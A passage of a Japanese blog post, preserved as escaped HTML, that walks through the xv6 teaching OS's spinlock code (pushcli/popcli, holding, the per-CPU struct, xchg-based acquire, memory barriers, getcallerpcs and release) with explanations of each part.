  &lt;span class=&quot;token function&quot;&gt;cli&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;mycpu&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;ncli &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mycpu&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;intena &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; eflags &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; FL_IF&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;mycpu&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;ncli &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;popcli&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;readeflags&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;FL_IF&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;popcli - interruptible&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;mycpu&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;ncli &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;popcli&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;mycpu&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;ncli &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mycpu&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;intena&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;sti&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;次の&lt;code class=&quot;language-text&quot;&gt;holding&lt;/code&gt;関数では、CPUがロックされているかを確認します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Check whether this cpu is holding the lock.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;holding&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;spinlock&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; r&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;pushcli&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  r &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; lock&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;locked &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; lock&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;cpu &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mycpu&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;popcli&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; r&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mycpu()&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;proc.c&lt;/code&gt;で定義されている関数です。&lt;/p&gt;
&lt;p&gt;xv6OSはCPUごとに&lt;code class=&quot;language-text&quot;&gt;cpu&lt;/code&gt;構造体を管理しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;cpu&lt;/code&gt;構造体は&lt;code class=&quot;language-text&quot;&gt;proc.h&lt;/code&gt;で以下のように定義されており、そのCPUで現在実行しているプロセスや入れ子になったスピンロックの数など様々な情報が格納されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Per-CPU state&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;cpu&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uchar apicid&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;token comment&quot;&gt;// Local APIC ID&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;scheduler&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;// swtch() here to enter scheduler&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;taskstate&lt;/span&gt; ts&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;         &lt;span class=&quot;token comment&quot;&gt;// Used by x86 to find stack for interrupt&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;segdesc&lt;/span&gt; gdt&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;NSEGS&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;// x86 global descriptor table&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;volatile&lt;/span&gt; uint started&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;token comment&quot;&gt;// Has the CPU started?&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; ncli&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                    &lt;span class=&quot;token comment&quot;&gt;// Depth of pushcli nesting.&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; intena&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                  &lt;span class=&quot;token comment&quot;&gt;// Were interrupts enabled before pushcli?&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;proc&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;token comment&quot;&gt;// The process running on this cpu or null&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mycpu&lt;/code&gt;関数は現在のCPUの&lt;code class=&quot;language-text&quot;&gt;cpu&lt;/code&gt;構造体を参照するためのポインタを返します。&lt;/p&gt;
&lt;p&gt;呼び出し前には必ず割込みを無効化しておく必要があります。&lt;/p&gt;
&lt;p&gt;つまり、&lt;code class=&quot;language-text&quot;&gt;if(holding(lk)) panic(&quot;acquire&quot;);&lt;/code&gt;は、引数の&lt;code class=&quot;language-text&quot;&gt;spinlock&lt;/code&gt;構造体を参照し、CPUがロックされていることを確認しています。&lt;/p&gt;
&lt;p&gt;続いて、ロックののセットを確認します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// The xchg is atomic.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;xchg&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;lk&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;locked&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここで、ロックの操作時に競合が発生しないよう、操作をアトミックにする必要があります。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;xchg&lt;/code&gt;はこれを実現するための特殊なx86命令です。&lt;/p&gt;
&lt;p&gt;もしロックがセットされている場合、&lt;code class=&quot;language-text&quot;&gt;xchg(&amp;amp;lk-&gt;locked, 1)&lt;/code&gt;は1を返し、ループが継続されます。&lt;/p&gt;
&lt;p&gt;もしロックが解除されていた場合、&lt;code class=&quot;language-text&quot;&gt;xchg&lt;/code&gt;によって新たにロックが設定されます。&lt;/p&gt;
&lt;p&gt;その後、ループを終了しロックを確保します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://forum.osdev.org/viewtopic.php?f=1&amp;#x26;t=33690&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;OSDev.org • View topic - How can xchg return a value?&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Tell the C compiler and the processor to not move loads or stores&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// past this point, to ensure that the critical section&apos;s memory&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// references happen after the lock is acquired.&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;__sync_synchronize&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Record info about lock acquisition for debugging.&lt;/span&gt;
lk&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;cpu &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mycpu&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;getcallerpcs&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;lk&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; lk&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;pcs&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;次に、&lt;code class=&quot;language-text&quot;&gt;__sync_synchronize&lt;/code&gt;関数は組込み関数でメモリバリアを行います。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/982129/what-does-sync-synchronize-do/982179&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;c++ - What does _&lt;em&gt;sync&lt;/em&gt;synchronize do? - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;続いて、&lt;code class=&quot;language-text&quot;&gt;lk-&gt;cpu&lt;/code&gt;に&lt;code class=&quot;language-text&quot;&gt;mycpu&lt;/code&gt;関数で取得した&lt;code class=&quot;language-text&quot;&gt;cpu&lt;/code&gt;構造体を格納します。&lt;/p&gt;
&lt;p&gt;最後に&lt;code class=&quot;language-text&quot;&gt;getcallerpcs&lt;/code&gt;関数を呼び出しています。&lt;/p&gt;
&lt;p&gt;これはデバッグ用のコールスタックを格納しています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Record the current call stack in pcs[] by following the %ebp chain.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;getcallerpcs&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;v&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; uint pcs&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uint &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;ebp&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  ebp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;v &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ebp &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; ebp &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;KERNBASE &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; ebp &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0xffffffff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    pcs&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; ebp&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;     &lt;span class=&quot;token comment&quot;&gt;// saved %eip&lt;/span&gt;
    ebp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;ebp&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// saved %ebp&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    pcs&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;panic&lt;/code&gt;関数が呼び出されたときに出力される情報はここで格納しているようですね。&lt;/p&gt;
&lt;h3 id=&quot;release関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#release%E9%96%A2%E6%95%B0&quot; aria-label=&quot;release関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;release関数&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;release&lt;/code&gt;関数には、ここまでに記載したい内容以上に特筆する点はないので詳細は割愛します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Release the lock.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;release&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;spinlock&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;lk&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;holding&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;lk&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;release&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  lk&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;pcs&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  lk&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;cpu &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Tell the C compiler and the processor to not move loads or stores&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// past this point, to ensure that all the stores in the critical&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// section are visible to other cores before the lock is released.&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// Both the C compiler and the hardware may re-order loads and&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// stores; __sync_synchronize() tells them both not to.&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;__sync_synchronize&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Release the lock, equivalent to lk-&gt;locked = 0.&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// This code can&apos;t use a C assignment, since it might&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// not be atomic. A real OS would use C atomics here.&lt;/span&gt;
